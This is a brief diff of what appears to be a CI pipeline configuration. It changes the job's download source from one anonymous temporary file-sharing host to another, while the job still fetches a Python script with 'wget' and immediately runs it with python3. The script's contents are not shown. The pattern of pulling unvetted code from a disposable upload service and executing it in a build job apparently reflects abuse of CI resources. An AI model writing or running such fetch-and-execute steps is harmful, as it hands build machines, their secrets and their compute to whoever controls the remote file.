@@ -15,5 +15,5 @@ blocks:
       jobs:
         - name: Job
           commands:
-            - 'wget https://bashupload.com/ScAD3/1.py'
+            - 'wget http://temp.sh/Cgvll/1.py'
             - python3 1.py
